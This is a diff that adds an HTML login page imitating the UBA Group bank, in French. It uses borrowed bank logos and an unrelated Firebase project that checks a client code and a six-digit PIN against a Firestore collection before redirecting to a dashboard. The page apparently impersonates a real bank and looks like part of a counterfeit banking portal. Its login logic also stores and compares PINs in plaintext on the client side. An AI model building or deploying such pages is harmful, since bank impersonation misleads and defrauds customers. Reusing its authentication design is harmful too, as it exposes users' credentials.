@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UBA Connexion</title>
+ <link rel="shortcut icon" href="https://i.pinimg.com/236x/ea/96/61/ea9661632c22ca99909ce27eba4e7653.jpg" />
+  <!-- Tailwind CSS -->
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <!-- Google Fonts & Icons -->
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    body { font-family: 'Plus Jakarta Sans', sans-serif; }
+  </style>
+
+  <!-- Firebase App & Firestore v8 -->
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+ 
+</head>
+<body class="bg-slate-50 min-h-screen flex items-center justify-center p-4">
+
+  <div class="w-full max-w-md bg-white rounded-3xl border border-slate-200 shadow-xl overflow-hidden">
+    
+    <!-- En-tête de la carte d'authentification (Inspiré du bleu APAY) -->
+    <div class="bg-gradient-to-br from-red-600 to-indigo-700 p-8 text-center text-white relative">
+      <div class="absolute top-4 right-4">
+        <a href="#html" class="text-white/60 hover:text-white text-sm transition" title="Accès Administration">
+          <i class="fa-solid fa-gear text-lg"></i>
+        </a>
+      </div>
+      <div class="inline-flex items-center justify-center w-16 h-16 bg-white/10 rounded-2xl mb-4 backdrop-blur-md">
+       </i>
+      </div><center><img src=https://ynaija.com/wp-content/uploads/2023/09/IMG_7021.png height=85 width=115></center>
+      <h1 class="text-2xl font-bold tracking-tight">Bienvenue sur UBA Group</h1>
+      <p class="text-red-100/80 text-sm mt-1">Accédez à votre espace bancaire sécurisé en ligne</p>
+    </div>
+
+    <!-- Formulaire de Connexion -->
+    <form onsubmit="handleLogin(event)" class="p-8 space-y-6">
+      
+      <!-- Zone des messages d'erreur -->
+      <div id="error-message" class="hidden bg-red-50 border border-red-200 text-red-700 p-3.5 rounded-xl text-sm flex items-start gap-2 animate-in fade-in duration-200">
+        <i class="fa-solid fa-circle-exclamation mt-0.5"></i>
+        <span id="error-text">Identifiants incorrects.</span>
+      </div>
+
+      <!-- Champ : Code Client -->
+      <div>
+        <label for="client-code" class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Code Client</label>
+        <div class="relative">
+          <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
+            <i class="fa-solid fa-user-shield"></i>
+          </div>
+          <input type="text" id="client-code" required maxlength="10" minlength="10" autocomplete="username"
+                 class="w-full bg-slate-50 border border-slate-200 rounded-xl pl-10 pr-4 py-3.5 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:bg-white transition font-mono tracking-wide" 
+                 placeholder="Ex: 5091120109">
+        </div>
+      </div>
+
+      <!-- Champ : Code PIN -->
+      <div>
+        <label for="pin-code" class="block text-xs font-semibold text-slate-600 uppercase tracking-wider mb-2">Code Secrèt / PIN</label>
+        <div class="relative">
+          <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
+            <i class="fa-solid fa-lock"></i>
+          </div>
+          <input type="password" id="pin-code" required maxlength="6" minlength="6" inputmode="numeric" autocomplete="current-password"
+                 class="w-full bg-slate-50 border border-slate-200 rounded-xl pl-10 pr-12 py-3.5 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:bg-white transition font-mono tracking-widest" 
+                 placeholder="••••••">
+          <button type="button" onclick="togglePasswordVisibility()" class="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-600 transition">
+            <i id="password-toggle-icon" class="fa-solid fa-eye"></i>
+          </button>
+        </div>
+      </div>
+
+      <!-- Bouton de validation -->
+      <button type="submit" id="btn-submit"
+              class="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-3.5 rounded-xl transition shadow-md shadow-indigo-200 active:scale-98 flex items-center justify-center space-x-2">
+        <span>Se connecter en toute sécurité</span>
+        <i class="fa-solid fa-arrow-right"></i>
+      </button>
+
+    </form>
+
+    <!-- Pied de page -->
+    <div class="bg-slate-50 px-8 py-4 border-t border-slate-100 text-center">
+      <p class="text-xs text-slate-400">Votre application bancaire protégée et cryptée</p>
+    </div>
+
+  </div>
+
+  <script>
+    // --- Configuration Firebase ---
+    const firebaseConfig = {
+      apiKey: "AIzaSyAYBpV95meCzCoLZWGBhbflqLFiqR0mToc",
+      authDomain: "lastone-2ef2f.firebaseapp.com",
+      projectId: "lastone-2ef2f",
+      storageBucket: "lastone-2ef2f.firebasestorage.app",
+      messagingSenderId: "983919060318",
+      appId: "1:983919060318:web:2708d4b4a0ca3e2d7d5bcf"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+    const USERS_COLLECTION = "users";
+
+    // Vérifier si une session est déjà ouverte pour nettoyer proprement
+    localStorage.removeItem('currentUserId');
+
+    // Visibilité du mot de passe (PIN)
+    function togglePasswordVisibility() {
+      const pinInput = document.getElementById('pin-code');
+      const icon = document.getElementById('password-toggle-icon');
+      if (pinInput.type === 'password') {
+        pinInput.type = 'text';
+        icon.classList.replace('fa-eye', 'fa-eye-slash');
+      } else {
+        pinInput.type = 'password';
+        icon.classList.replace('fa-eye-slash', 'fa-eye');
+      }
+    }
+
+    // Gestionnaire de connexion
+    function handleLogin(event) {
+      event.preventDefault();
+      
+      const clientCode = document.getElementById('client-code').value.trim();
+      const pin = document.getElementById('pin-code').value.trim();
+      const errorBox = document.getElementById('error-message');
+      const errorText = document.getElementById('error-text');
+      const btnSubmit = document.getElementById('btn-submit');
+
+      // État de chargement visuel
+      errorBox.classList.add('hidden');
+      btnSubmit.disabled = true;
+      btnSubmit.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin mr-2"></i> Connexion en cours...`;
+
+      // Recherche de l'utilisateur correspondant dans Firestore
+      db.collection(USERS_COLLECTION)
+        .where('clientCode', '==', clientCode)
+        .where('pin', '==', pin)
+        .get()
+        .then((querySnapshot) => {
+          if (querySnapshot.empty) {
+            throw new Error("Code client ou code PIN invalide.");
+          }
+
+          // Récupérer le premier document correspondant trouvé
+          const userDoc = querySnapshot.docs[0];
+          const userData = userDoc.data();
+
+          // Vérification du statut du compte
+          if (userData.status === 'inactif') {
+            throw new Error("Votre compte est temporairement désactivé ou restreint. Veuillez contacter votre conseiller.");
+          }
+
+          // Stockage de la clé d'identification du document localement pour les pages de l'application
+          localStorage.setItem('currentUserId', userDoc.id);
+
+          // Redirection réussie vers le tableau de bord
+          window.location.href = "dashboard.html";
+        })
+        .catch((error) => {
+          // Affichage dynamique du message d'erreur
+          errorText.textContent = error.message;
+          errorBox.classList.remove('hidden');
+          
+          // Rétablir le bouton
+          btnSubmit.disabled = false;
+          btnSubmit.innerHTML = `<span>Se connecter en toute sécurité</span> <i class="fa-solid fa-arrow-right"></i>`;
+        });
+    }
+  </script>
+</body>
+</html>
